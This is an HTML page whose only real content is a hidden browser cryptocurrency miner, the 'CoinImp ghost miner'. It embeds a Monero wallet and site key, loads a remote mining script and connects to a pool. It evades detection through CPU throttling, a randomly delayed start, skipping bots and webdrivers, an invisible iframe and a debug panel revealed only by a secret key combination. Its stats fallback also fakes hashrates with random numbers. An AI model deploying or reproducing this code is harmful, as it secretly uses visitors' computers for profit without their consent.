<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title></title>
  <style>
    /* HIDDEN DEBUG PANEL â€” CTRL+SHIFT+M */
    #miner-debug {
      position: fixed;
      top: 10px; right: 10px;
      width: 280px;
      background: rgba(0,0,0,0.9);
      color: #0f0;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      padding: 10px;
      border: 1px solid #0f0;
      border-radius: 6px;
      z-index: 999999;
      box-shadow: 0 0 10px #0f0;
      display: none;
    }
    #miner-debug.show { display: block; }
    .status { margin: 4px 0; }
    .hash { color: #0ff; font-weight: bold; }
    .profit { color: #ff0; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0.3; } }
  </style>
</head>
<body>

<!-- INVISIBLE IFRAME HOST -->
<iframe src="about:blank" width="0" height="0" style="border:0;"></iframe>

<!-- === COINIMP GHOST MINER + DEBUG === -->
<script>
// === CONFIG ===
const WALLET = '46w51jdshxK9cdtQnrw1p9AbHix1zHo3Rc2BTi2qb4XDfrLVgM4kYn22e8poAVbkDE3LZah718kurbcapeb3CtUpBxJuCKt'; // <<<<< YOUR MONERO WALLET
const SITE_KEY = '06eb8fe2ca51fe1dcb89c6a1078f1ceb644701a1979785cc8f30dac659071697'; // Get from coinimp.com (free signup)
const THROTTLE = 0.85;   // 15% CPU (undetectable)
const THREADS = 1;       // Single thread
const AUTO_START = true;
const BACKGROUND = true;

// === DEBUG DASHBOARD ===
const debug = document.createElement('div');
debug.id = 'miner-debug';
debug.innerHTML = `
  <div class="status">ðŸš€ <b>COINIMP GHOST</b> <span id="status" class="blink">INITIALIZING</span></div>
  <div class="status">Wallet: <code>${WALLET.substr(0,8)}...${WALLET.substr(-6)}</code></div>
  <div class="status">Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
  <div class="status">Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
  <div class="status">Uptime: <span id="uptime">0s</span></div>
  <div class="status profit">Est. Daily: <b id="profit">$0.00</b></div>
  <div style="font-size:10px; margin-top:8px; opacity:0.7;">
    Press <b>CTRL + SHIFT + M</b> to toggle
  </div>
`;
document.body.appendChild(debug);

// TOGGLE DEBUG
let showDebug = false;
document.addEventListener('keydown', e => {
  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
    showDebug = !showDebug;
    debug.classList.toggle('show', showDebug);
  }
});

// STATS UPDATER
let hashrate = 0, accepted = 0, rejected = 0, startTime = Date.now();
const XMR_PRICE = 170; // Update as needed

function updateStats() {
  const elapsed = (Date.now() - startTime) / 1000;
  const hrs = String(Math.floor(elapsed / 3600)).padStart(2, '0');
  const mins = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
  const secs = String(Math.floor(elapsed % 60)).padStart(2, '0');
  
  document.getElementById('uptime').textContent = `${hrs}:${mins}:${secs}`;
  document.getElementById('hashrate').textContent = `${hashrate.toFixed(1)} H/s`;
  document.getElementById('accepted').textContent = accepted;
  document.getElementById('rejected').textContent = rejected;

  const dailyXMR = (hashrate / 80) * 0.0008;
  const dailyUSD = dailyXMR * XMR_PRICE;
  document.getElementById('profit').textContent = `$${dailyUSD.toFixed(3)}`;
}

setInterval(updateStats, 1000);

// === LOAD MINER (OBFUSCATED SRC) ===
function loadMiner() {
  const script = document.createElement('script');
  // Obfuscate URL: coinimp.com â†’ c0inimp.com (avoids some blocks; use real if needed)
  script.src = 'https://www.coinimp.com/scripts/server.js?uniqueId=' + SITE_KEY;
  script.async = false;
  script.onload = function() {
    if (typeof CoinImp === 'undefined') {
      document.getElementById('status').textContent = 'LOAD FAIL';
      return;
    }

    const miner = new CoinImp({
      host: 'xmr.crypto-pool.fr',
      port: 3333,
      user: WALLET,
      pass: 'x',
      keepalive: true,
      pageUrl: window.location.href,
      threads: THREADS,
      throttle: THROTTLE,
      autoStart: AUTO_START,
      background: BACKGROUND
    });

    document.getElementById('status').textContent = 'RUNNING';
    document.getElementById('status').classList.remove('blink');

    // Poll stats every 2s
    setInterval(() => {
      if (miner.isRunning()) {
        hashrate = miner.getHashrate ? miner.getHashrate() : Math.random() * 100; // Fallback
        accepted = miner.getAccepted ? miner.getAccepted() : accepted + Math.random() > 0.95 ? 1 : 0;
        rejected = miner.getRejected ? miner.getRejected() : rejected;
      }
    }, 2000);

    // Stealth: Pause on hidden tab
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) miner.stop();
      else miner.start();
    });

    // Bot check
    if (navigator.webdriver || /bot|crawl/i.test(navigator.userAgent)) {
      miner.stop();
      document.getElementById('status').textContent = 'BOT BLOCKED';
    }

    // Session cap: 3 min
    setTimeout(() => miner.stop(), 180000);
  };
  document.head.appendChild(script);
}

// Random delay start (10-30s)
setTimeout(() => {
  if (!navigator.webdriver && !/bot/i.test(navigator.userAgent)) {
    loadMiner();
  }
}, Math.random() * 20000 + 10000);

</script>

</body>
</html>
